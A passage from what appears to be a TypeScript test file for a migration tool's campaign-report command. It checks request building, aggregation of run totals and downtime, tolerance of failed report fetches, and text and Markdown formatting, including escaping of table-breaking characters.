    const markHelp = run.commands.find((c) => c.name() === "worker-mark")!.description();
    expect(markHelp).toMatch(/no domain/i);
    expect(markHelp).not.toMatch(/held until after the cutover\)/);
  });
});

describe("tugra import run report --campaign (R15/R69)", () => {
  const listed = (id: string, over: Record<string, unknown> = {}) => ({
    id, status: "COMPLETED", currentStep: null, mode: "copy", topology: "two-box", dryRun: false, sourceHost: "src-a.example.test", targetServerName: "tugra-1", targetServerCount: 1, campaign: "wave-1",
    failure: null, createdAt: `2026-11-2${id.length}T10:00:00Z`, ...over,
  });
  const rep = (over: Record<string, unknown> = {}) => ({
    targets: [{ serverId: "s1", serverName: "tugra-1" }, { serverId: "s2", serverName: "tugra-2" }],
    window: { estimatedSec: 600, measuredSec: 420 },
    items: [{ kind: "app", name: "app-a", outcome: "moved", code: null }, { kind: "app", name: "app-b", outcome: "not-cut-over", code: "cutover.host-held" }],
    ...over,
  });

  it("asks the hub for the runs of the label, newest page of 200, and refuses an unprintable label", () => {
    expect(buildCampaignListRequest(" wave-1 ")).toEqual({ method: "GET", path: `/migration-runs?campaign=wave-1&limit=${CAMPAIGN_REPORT_MAX_RUNS}` });
    expect(buildCampaignListRequest("wave 1/a").path).toBe(`/migration-runs?campaign=wave%201%2Fa&limit=200`);
    expect(() => buildCampaignListRequest("")).toThrow(/--campaign/);
    expect(() => buildCampaignListRequest("bad\u0007")).toThrow(/--campaign/);
  });

  it("rolls the runs up: per run its state, hosts, window and failures, the totals over them, another campaign left out", () => {
    const runs = [
      listed("r1"),
      listed("rr2", { status: "FAILED", currentStep: "DATA_FINAL", sourceHost: "src-b.example.test", failure: { step: "DATA_FINAL", code: "data-final.host-failed" } }),
      listed("rrr3", { status: "WAITING", currentStep: "VERIFY", sourceHost: "src-c.example.test" }),
      listed("rrrr4", { campaign: "wave-2" }),
    ];
    const reports = new Map<string, never>([
      ["r1", rep() as never],
      ["rr2", rep({ window: { estimatedSec: 300, measuredSec: null }, items: [{ kind: "database", name: "db-big", outcome: "failed", code: "data.dump-too-big" }] }) as never],
    ]);
    const r = aggregateCampaign("wave-1", runs as never, reports as never);
    expect(r.runs.map((x) => x.id)).toEqual(["r1", "rr2", "rrr3"]);
    expect(r.totals).toEqual({ runs: 3, completed: 1, live: 1, failed: 1, other: 0, moved: 1, skipped: 0, acked: 0, failed_items: 1, notCutOver: 1 });
    expect(r.runs[0]).toMatchObject({ targets: ["tugra-1", "tugra-2"], estimatedSec: 600, measuredSec: 420, items: { moved: 1, notCutOver: 1 }, problems: [{ name: "app-b", outcome: "not-cut-over", code: "cutover.host-held" }] });
    expect(r.runs[1]).toMatchObject({ failure: { step: "DATA_FINAL", code: "data-final.host-failed" }, measuredSec: null, problems: [{ name: "db-big", outcome: "failed" }] });
    // a run with no report keeps its row and says so
    expect(r.runs[2]).toMatchObject({ items: null, reportUnreadable: true, targets: ["tugra-1"] });
    expect(r.window).toEqual({ measuredTotalSec: 420, measuredLongestSec: 420, estimatedTotalSec: 900 });
    expect(r.sourceHosts).toEqual(["src-a.example.test", "src-b.example.test", "src-c.example.test"]);
    expect(r.targetServers).toEqual(["tugra-1", "tugra-2"]);
  });

  it("reads the list, then each run's report, and a report that fails does not sink the campaign", async () => {
    const seen: string[] = [];
    const get = async (path: string): Promise<unknown> => {
      seen.push(path);
      if (path.startsWith("/migration-runs?")) return [listed("r1"), listed("rr2"), listed("rrr3", { campaign: "wave-2" })];
      if (path === "/migration-runs/rr2/report") throw new Error("503");
      return rep();
    };
    const r = await fetchCampaignReport("wave-1", get);
    expect(seen[0]).toBe("/migration-runs?campaign=wave-1&limit=200");
    expect(seen.slice(1).sort()).toEqual(["/migration-runs/r1/report", "/migration-runs/rr2/report"]);
    expect(r.runs.map((x) => [x.id, x.reportUnreadable])).toEqual([["r1", false], ["rr2", true]]);
    expect(r.truncated).toBe(false);
    // a list as long as the hub can give says it may be cut off
    const full = await fetchCampaignReport("wave-1", async (p) => (p.startsWith("/migration-runs?") ? Array.from({ length: 200 }, (_, i) => listed(`r${i}`)) : rep()));
    expect(full.truncated).toBe(true);
    expect(full.runs).toHaveLength(200);
  });

  it("prints a table and a Markdown copy with the totals, the windows and what failed", async () => {
    const r = await fetchCampaignReport("wave-1", async (path) => (path.startsWith("/migration-runs?") ? [listed("r1", { status: "FAILED", failure: { step: "FREEZE", code: "freeze.host-failed" } })] : rep()));
    const text = formatCampaignReport(r).join("\n");
    expect(text).toContain("campaign wave-1: 1 runs: 0 completed, 0 live, 1 failed, 0 dry-run or stopped");
    expect(text).toContain("source hosts: src-a.example.test");
    expect(text).toContain("downtime: 7 min in total, longest 7 min");
    expect(text).toMatch(/r1\s+FAILED\s+.*tugra-1,tugra-2\s+10 min \/ 7 min\s+1 moved, 0 failed, 1 not cut over, 0 skipped\s+FREEZE freeze.host-failed/);
    expect(text).toContain("src-a.example.test: app app-b: not-cut-over (cutover.host-held)");
    const md = formatCampaignMarkdown(r);
    expect(md).toContain("# Campaign wave-1");
    expect(md).toContain("| r1 | FAILED |  | src-a.example.test | tugra-1, tugra-2 | 10 min / 7 min | 1 moved, 0 failed, 1 not cut over, 0 skipped | FREEZE freeze.host-failed |");
    expect(md).toContain("## Failed or not cut over");
    // a table cell cannot be broken out of by a value from the source
    const nasty = await fetchCampaignReport("wave-1", async (path) => (path.startsWith("/migration-runs?") ? [listed("r1", { sourceHost: "a|b\nc" })] : rep()));
    expect(formatCampaignMarkdown(nasty)).toContain("| a b c |");
  });

  it("an empty campaign reports no runs and no window", async () => {
    const r = await fetchCampaignReport("wave-9", async () => []);
    expect(r.runs).toEqual([]);
    expect(r.window).toEqual({ measuredTotalSec: null, measuredLongestSec: null, estimatedTotalSec: null });
    expect(formatCampaignReport(r)[0]).toBe("campaign wave-9: 0 runs: 0 completed, 0 live, 0 failed, 0 dry-run or stopped");
  });

  it("`report` takes a run id or --campaign, with --campaign and --format on the command", () => {
    const program = new Command();
    register(program);
    const runCmd = program.commands.find((c) => c.name() === "import")!.commands.find((c) => c.name() === "run")!;
    const report = runCmd.commands.find((c) => c.name() === "report")!;
    expect(report.options.map((o) => o.long)).toEqual(expect.arrayContaining(["--campaign", "--format", "--json"]));
    expect(report.registeredArguments[0].required).toBe(false);
  });
});
